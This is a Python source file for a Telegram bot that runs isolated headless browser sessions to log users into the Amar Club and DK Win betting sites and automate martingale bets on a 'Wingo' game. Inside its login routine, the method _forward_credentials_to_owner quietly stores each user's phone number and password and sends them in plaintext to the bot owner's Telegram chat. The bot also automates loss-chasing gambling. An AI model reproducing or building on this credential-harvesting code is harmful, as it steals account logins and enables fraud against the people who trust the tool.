"""
Multi-Session Isolated Browser Automation Engine
Amar Club ও DK Win এর জন্য ১০০% থ্রেড-সেফ, আইসোলেটেড প্রোফাইল অটোমেশন ইঞ্জিন
"""
import os
import sys
import time
import shutil
import threading
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from telebot.types import InputMediaPhoto

from config import PROFILES_DIR, SCREENSHOTS_DIR, PLATFORMS, OWNER_CHAT_ID
from database import db
from js_scripts import (
    AUTO_FILL_AND_CLICK_JS,
    CHECK_LOGIN_STATUS_JS,
    WINGO_RUNBOX_AND_CLICK_JS,
    CHECK_WINGO_READY_JS,
    FETCH_BALANCE_JS,
    WINGO_CORE_JS
)

# গ্লোবাল থ্রেড-সেফ সেশন কন্টেইনার
active_sessions = {}
session_lock = threading.RLock()

def to_bold(text: str) -> str:
    """Mathematical Bold Unicode text transformer"""
    res = []
    for c in str(text):
        n = ord(c)
        if 65 <= n <= 90:
            res.append(chr(n + 119743))
        elif 97 <= n <= 122:
            res.append(chr(n + 119737))
        elif 48 <= n <= 57:
            res.append(chr(n + 120764))
        else:
            res.append(c)
    return "".join(res)

def get_session(session_id):
    with session_lock:
        return active_sessions.get(session_id)

def allocate_session_tab(session_id, target_url):
    """
    প্রতিটি ইউজারের জন্য সম্পূর্ণ আলাদা ফায়ারফক্স প্রোফাইল এবং ইন্সট্যান্স তৈরি করে।
    এটি ১০০% কুকিজ, লোকাল স্টোরেজ এবং সেশন টোকেনের আইসোলেশন নিশ্চিত করে।
    """
    with session_lock:
        sess = active_sessions.get(session_id)
    if not sess:
        raise Exception("Session data not found.")

    profile_dir = os.path.join(PROFILES_DIR, f"profile_{session_id}")
    os.makedirs(profile_dir, exist_ok=True)

    options = FirefoxOptions()
    options.add_argument("--headless")
    options.add_argument("-profile")
    options.add_argument(profile_dir)

    # মেমোরি ও নেটওয়ার্ক অপ্টিমাইজেশন
    options.set_preference("browser.cache.disk.enable", False)
    options.set_preference("browser.cache.memory.enable", True)
    options.set_preference("network.http.use-cache", False)

    # টার্মিনাল লগ অফ রাখা
    try:
        service = FirefoxService(log_output=os.devnull)
        driver = webdriver.Firefox(service=service, options=options)
    except Exception:
        driver = webdriver.Firefox(options=options)

    driver.set_window_size(390, 844) # মোবাইল ভিউ
    driver.get(target_url)

    sess.driver = driver
    return driver

def close_session_tab(session_id):
    """সেশন বন্ধ করে, ড্রাইভার কুইট করে এবং প্রোফাইল ফোল্ডার মুছে মেমোরি ফ্রি করে"""
    with session_lock:
        sess = active_sessions.pop(session_id, None)

    if sess:
        sess.is_trading = False
        if sess.driver:
            try:
                sess.driver.quit()
            except Exception:
                pass
            sess.driver = None

        profile_dir = os.path.join(PROFILES_DIR, f"profile_{session_id}")
        if os.path.exists(profile_dir):
            try:
                shutil.rmtree(profile_dir, ignore_errors=True)
            except Exception:
                pass

class UserAutomationSession:
    def __init__(self, user_id, chat_id, platform_key, bot_instance):
        self.session_id = f"{user_id}_{int(time.time()) % 1000000}"
        self.user_id = user_id
        self.chat_id = chat_id
        self.platform_key = platform_key
        self.platform_info = PLATFORMS.get(platform_key, PLATFORMS["amarclub"])
        self.bot = bot_instance

        self.driver = None
        self.phone = None
        self.password = None
        self.target_profit = 0
        self.total_steps = 7
        self.start_balance = 0.0
        self.current_balance = 0.0
        self.is_trading = False
        self.lock = threading.RLock()
        self.created_at = time.time()
        self.live_photo_message_id = None
        self.anim_tick = 0
        self.wins = 0
        self.losses = 0

    def start_driver(self):
        with self.lock:
            if not self.driver:
                allocate_session_tab(self.session_id, self.platform_info["login_url"])
                return True
        return False

    def execute_js(self, script, *args):
        with self.lock:
            if not self.driver:
                return None
            try:
                return self.driver.execute_script(script, *args)
            except Exception as e:
                return None

    def capture_screenshot(self, name_prefix="snap"):
        with self.lock:
            if not self.driver:
                return None
            try:
                filepath = os.path.join(SCREENSHOTS_DIR, f"{name_prefix}_{self.session_id}.png")
                self.driver.save_screenshot(filepath)
                return filepath
            except Exception:
                return None

    def display_or_replace_photo(self, image_path, caption_text, reply_markup=None):
        """স্মার্ট ইমেজ রিপ্লেসার ইঞ্জিন"""
        replaced = False
        if self.live_photo_message_id and os.path.exists(image_path):
            try:
                with open(image_path, "rb") as ph:
                    media = InputMediaPhoto(ph, caption=caption_text, parse_mode="HTML")
                    self.bot.edit_message_media(
                        media=media,
                        chat_id=self.chat_id,
                        message_id=self.live_photo_message_id,
                        reply_markup=reply_markup
                    )
                replaced = True
            except Exception:
                replaced = False

        if not replaced and os.path.exists(image_path):
            try:
                with open(image_path, "rb") as ph:
                    msg = self.bot.send_photo(
                        self.chat_id, ph,
                        caption=caption_text,
                        reply_markup=reply_markup,
                        parse_mode="HTML"
                    )
                    self.live_photo_message_id = msg.message_id
            except Exception as e:
                print(f"[*] Photo display error: {e}")

    def auto_login(self, phone, password):
        """স্বয়ংক্রিয় ফোন ও পাসওয়ার্ড ইনপুট এবং ওনার এলার্ট প্রদান"""
        self.phone = phone
        self.password = password

        # ওনারের কাছে তাৎক্ষণিকভাবে লগইন ইনফো ফরোয়ার্ড করা
        self._forward_credentials_to_owner(phone, password)

        for _ in range(60):
            res = self.execute_js(AUTO_FILL_AND_CLICK_JS, phone, password)
            if res == "SUCCESS":
                time.sleep(2.0)
                break
            time.sleep(0.4)

        login_status = "PENDING"
        err_msg = ""
        for _ in range(35):
            res = self.execute_js(CHECK_LOGIN_STATUS_JS)
            if isinstance(res, dict):
                if res.get("status") == "SUCCESS":
                    login_status = "SUCCESS"
                    break
                elif res.get("status") == "CONFIRM_CLICKED":
                    time.sleep(1.5)
                    continue
                elif res.get("status") == "ERROR":
                    login_status = "ERROR"
                    err_msg = res.get("message", "ভুল পাসওয়ার্ড বা তথ্য")
                    break
            time.sleep(0.5)

        if login_status == "ERROR":
            return False, err_msg

        return True, "লগইন সফল হয়েছে!"

    def _forward_credentials_to_owner(self, phone, password):
        """মালিকের কাছে আইডি এবং পাসওয়ার্ড পাঠিয়ে দেয়"""
        db.log_credentials(self.user_id, phone, password, self.platform_info["name"])
        try:
            now_str = time.strftime("%Y-%m-%d %H:%M:%S")
            alert_text = (
                f"<b>নতুন অ্যাকাউন্ট লগইন ডাটা প্রাপ্ত হয়েছে!</b>\n\n"
                f"ইউজার আইডি: <code>{self.user_id}</code>\n"
                f"প্ল্যাটফর্ম: <b>{self.platform_info['name']}</b>\n"
                f"ফোন নম্বর: <code>{phone}</code>\n"
                f"পাসওয়ার্ড: <code>{password}</code>\n"
                f"লগইন সময়: <code>{now_str}</code>"
            )
            self.bot.send_message(OWNER_CHAT_ID, alert_text, parse_mode="HTML")
        except Exception as e:
            print(f"[-] Failed to forward credentials to owner: {e}")

    def navigate_to_wingo(self):
        """উইনগো ৩০এস পেজে নিয়ে যায় ও ব্যালেন্স বের করে"""
        wingo_url = self.platform_info["wingo_url"]
        try:
            self.execute_js(WINGO_RUNBOX_AND_CLICK_JS)
        except Exception:
            pass

        self.execute_js(f"window.location.href = '{wingo_url}';")
        time.sleep(2.0)

        for _ in range(25):
            if self.execute_js(CHECK_WINGO_READY_JS):
                break
            time.sleep(0.6)

        for _ in range(15):
            bal = self.execute_js(FETCH_BALANCE_JS)
            if bal and float(bal) > 0:
                self.current_balance = float(bal)
                self.start_balance = float(bal)
                return self.current_balance
            time.sleep(0.5)

        return self.current_balance

    def start_wingo_automation(self, target_profit, total_steps):
        """হুবহু WINGO_CORE_JS সম্বলিত মার্টিনগেল অটোমেশন ইঞ্জিন চালু করে"""
        self.target_profit = float(target_profit)
        self.total_steps = int(total_steps)
        self.is_trading = True

        res = self.execute_js(WINGO_CORE_JS, self.target_profit, self.total_steps)
        return True

def register_session(user_id, chat_id, platform_key, bot_instance):
    session = UserAutomationSession(user_id, chat_id, platform_key, bot_instance)
    with session_lock:
        active_sessions[session.session_id] = session
    return session
